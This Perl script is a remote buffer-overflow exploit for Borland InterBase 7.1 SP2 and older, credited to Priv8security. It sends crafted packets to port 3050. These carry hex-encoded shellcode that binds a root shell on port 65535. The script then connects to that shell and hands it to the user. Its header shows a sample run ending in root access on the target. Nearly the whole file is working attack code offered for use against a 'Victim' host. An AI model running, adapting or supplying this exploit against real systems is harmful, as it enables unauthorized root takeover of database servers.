#!/usr/bin/perl
# Priv8security com remote exploit for Borland Interbase 7.1 SP 2 and lower
# Public Version!!!
#
# Bug found by Aviram Jenik www.securiteam.com unixfocus 5AP0P0UCUO.html
#
# [wsxz@localhost buffer]$ perl priv8ibserverb.pl -h localhost -t 0
#
# -=[ Priv8security.com InterBase Server 7.1 SP2 and lower remote exploit ]=-
#
# [+] Using target 0: Linux Interbase 7.1 SP 2
# [+] Sending first buffer... d0ne!
# [+] Waiting... Got awnser!
# [+] Sending final hit... Done!
# [+] Enjoy your stay on this server =)
#
# ****** Welcome to 'localhost' ******
#
# Linux localhost 2.4.21-0.27mdk #1 Wed Jan 7 03:44:18 MST 2004 i686 unknown
# unknown GNU/Linux
# uid=0(root) gid=0(root) groups=0(root)
#
use IO::Socket;
use Getopt::Std; getopts('h:p:t:o:', \%args);

if (defined($args{'h'})) { $host = $args{'h'}; }
if (defined($args{'p'})) { $port = $args{'p'}; }else{$port = 3050;}
if (defined($args{'t'})) { $target = $args{'t'}; }else{$target = 0;}
if (defined($args{'o'})) { $offset = $args{'o'}; }else{$offset = 0;}

print "\n-=[ Priv8security.com InterBase Server 7.1 SP2 and lower remote exploit ]=-\n\n";
if(!defined($host)){
print "Usage:
-h <host>
-p Port <default 3050>
-t Target number from list.\n\n";
print STDERR "Targets:
0 - Linux Interbase 7.1 SP 2
1 - Linux Interbase 6.01 InterBaseSS_LI-V6.0-1.i386.rpm
2 - Crash\n\n";
print STDERR "Usage: perl $0 -h Victim -t target\n\n";
exit;
}

$shellcode = # portbind 65535 by Ramon de Carvalho priv8security.com
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a".
"\x02\x89\xe1\xb0\x66\xcd\x80\xff".
"\x49\x02\x6a\x10\x51\x50\x89\xe1".
"\x43\xb0\x66\xcd\x80\x89\x41\x04".
"\xb3\x04\xb0\x66\xcd\x80\x43\xb0".
"\x66\xcd\x80\x59\x93\xb0\x3f\xcd".
"\x80\x49\x79\xf9\x68\x2f\x2f\x73".
"\x68\x68\x2f\x62\x69\x6e\x89\xe3".
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

if ( $target == "0" ) { # TESTED
$ret = 0x081b7ee3; # jmp esp
$pack = 0;
$desc = "Linux Interbase 7.1 SP 2";
}
if ( $target == "1" ) { # TESTED
$ret = 0x080c77bd; # jmp esp
$pack = 1;
$desc = "Linux Interbase 6.01 .rpm";
}
if ( $target == "2" ) {
$ret = 0x41424344;
$pack = 1;
$desc = "Crash it!";
}

$new_ret = pack('l', ($ret));

# Request buffer
$buffer = "\x00\x00\x00\x01\x00\x00\x00\x13\x00\x00\x00\x02\x00\x00".
"\x00\x24\x00\x00\x01\x4e".
"A" x 334 .
"\x00\x00\x00\x00\x00\x04\x00\x00\x00\x10\x01\x05".
"\x61\x6c\x69\x6d\x61\x04\x05\x6c\x69\x6e\x75\x78\x06\x00\x00\x00".
"\x00\x08\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00".
"\x00\x02\x00\x00\x00\x08\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00".
"\x00\x04\x00\x00\x00\x03\x00\x00\x00\x0a\x00\x00\x00\x01\x00\x00".
"\x00\x02\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x0a\x00\x00".
"\x00\x24\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x05";

# This buffer is for 7.1 version, its a simple classic overflow.
$buffer2 = "\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x01\x2c".
"A" x 152 . $new_ret . "\x90" x (144 - length($shellcode)) . $shellcode.
"\x00\x00\x00\x00".
"\x00\x1c\x01\x1c\x04\x72\x6f\x6f\x74\x1e\x0b\x74\x5a\x72\x64\x6d".
"\x68\x4b\x58\x42\x66\x51\x3a\x04\x3c\x00\x00\x00\x3e\x00";

# This buffer is for 6.01, a little tricky to exploit.
$buffer3 = "\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x01\x4e".
"\x90" x (128 - length($shellcode)) . $shellcode.
$new_ret x 2 . "\xf8\xfd\xff\xbf" . "\x90" x (180 - length($shellcode)) . $shellcode.
"\xf0\x3a\x1e\x08".
"AAAAAAAAAA".
"\x00\x00\x00\x00".
"\x00\x1c\x01\x1c\x04\x72\x6f\x6f\x74\x1e\x0b\x7a\x5a\x72\x64\x6d".
"\x68\x4b\x58\x42\x66\x51\x3a\x04\x3c\x00\x00\x00\x3e\x00";

$sock = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>$port)
or die "[-] Cant Connect!!\n";

print STDERR "[+] Using target $target: $desc\n";
print STDERR "[+] Sending first buffer...";
$sock->send($buffer);
print STDERR " d0ne!\n";
print STDERR "[+] Waiting... ";
$sock->recv($text,128);
if($text){
print STDERR "Got awnser!\n";
}
print STDERR "[+] Sending final hit... ";
if($pack){
$sock->send($buffer3);
}else{
$sock->send($buffer2);
}
print STDERR "Done!\n";
sleep(3);

$sc = IO::Socket::INET->new(Proto=>"tcp", PeerHost=>$host,PeerPort=>65535,Type=>SOCK_STREAM,Reuse=>1)
or die "[-] No luck, try other offset next time ok.\n";

print "[+] Enjoy your stay on this server =)\n";

$sc->autoflush(1);

print $sc "echo;echo \"****** Welcome to '`hostname -s`' ******\"\n";
print $sc "echo;uname -a;id;echo\n";

die "cant fork: $!" unless defined($pid = fork());

if ($pid) {
while(defined ($line = <$sc>)) {
print STDOUT $line;
}
kill("TERM", $pid);
}
else
{
while(defined ($line = <STDIN>)) {
print $sc $line;
}
}
close($sc);
print "Good bye!!\n";

